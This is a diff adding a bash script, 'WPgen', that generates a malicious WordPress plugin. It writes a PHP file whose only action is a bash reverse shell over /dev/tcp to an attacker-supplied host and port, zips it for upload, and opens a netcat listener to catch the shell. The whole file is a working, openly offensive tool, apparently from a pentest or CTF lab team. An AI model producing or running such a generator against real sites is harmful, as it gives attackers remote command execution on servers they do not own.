@@ -1,0 +1,98 @@
+#!/bin/bash
+
+readonly RED="\e[91m"
+readonly GREEN="\e[92m"
+readonly YELLOW="\e[93m"
+readonly BLUE="\e[94m"
+readonly WHITE="\e[97m"
+readonly END="\e[0m"
+readonly SEPARATOR="───────────────────────────────"
+
+function check(){
+    which zip > /dev/null 2>&1
+  if [ "$(echo $?)" == "0" ]; then
+    :
+  else
+    apt install -y zip > /dev/null 2>&1
+  fi
+}
+
+function banner(){
+  echo -e "${BLUE}  _ _ _ _____   ${WHITE}  ___ ___ ___ ${END}"
+  echo -e "${BLUE} | | | |  _  |  ${WHITE} | . | -_|   |${END}"
+  echo -e "${BLUE} | | | |   __|  ${WHITE} |_  |___|_|_|${END}"
+  echo -e "${BLUE} |_____|__|     ${WHITE} |___|        ${END}"
+  echo -e "${SEPARATOR}                                       "
+}
+
+function help(){
+  echo -e "\n ❓  Usage: WPgen [OPTIONS]\n"
+  echo -e " 🌐  Automatic malicious plugin generator for WordPress.\n"
+  echo -e " 📋  Options:"
+  echo -e "       -l <LOCAL HOST>  Specify the attacker local IP address."
+  echo -e "       -p <LOCAL PORT>  Specify the attacker local port."
+  echo -e "       -h               Display this help message and exit.\n"
+  echo -e " 💡  Examples:"
+  echo -e "       WPgen -l 192.168.1.X -p 443  Enter the IP & port to create a plugin with a reverse shell."
+  echo -e "       WPgen -h                     Show this help message.\n"
+  echo -e "${SEPARATOR}\n"
+}
+
+function attackerInfo(){
+  echo -e " 🎯 LHOST      │ ${LHOST}"
+  echo -e " 🎯 LPORT      │ ${LPORT}"
+}
+
+function createPlugin(){
+  echo -e " ❗ Creating   │ plugin.php${END}"
+
+cat <<EOF > plugin.php
+<?php
+
+/**
+* Plugin Name: WPGen
+* Plugin URI: http://127.0.0.1
+* Description: Arsenal
+* Version: 1.0
+* Author: VulNyx Team
+* Author URI: https://vulnyx.com
+*/
+
+exec("bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'");
+
+?>
+EOF
+}
+
+function compressPlugin(){
+  zip plugin.zip plugin.php >/dev/null 2>&1
+  rm -rf plugin.php
+  echo -e " 🗄️ Compress   │ php > zip ${END}"
+  echo -e " 💥 Generated  │ ${GREEN}plugin.zip${END}"
+}
+
+function listenerNetcat(){
+  echo -e " ⚠️ Netcat     │ ⬇️ ${END}"
+  echo -e "${SEPARATOR}\n"
+  nc -lvnp ${LPORT}
+}
+
+while getopts "l:p:" ARG; do
+  case ${ARG} in
+    l) LHOST=$OPTARG; let parameter_counter+=1 ;;
+    p) LPORT=$OPTARG; let parameter_counter+=1 ;;
+  esac
+done
+
+if [[ -n "${LHOST}" && -n "${LPORT}" ]]; then
+  banner
+  check
+  createPlugin
+  attackerInfo
+  compressPlugin
+  listenerNetcat
+else
+  banner
+  help
+  exit 0
+fi
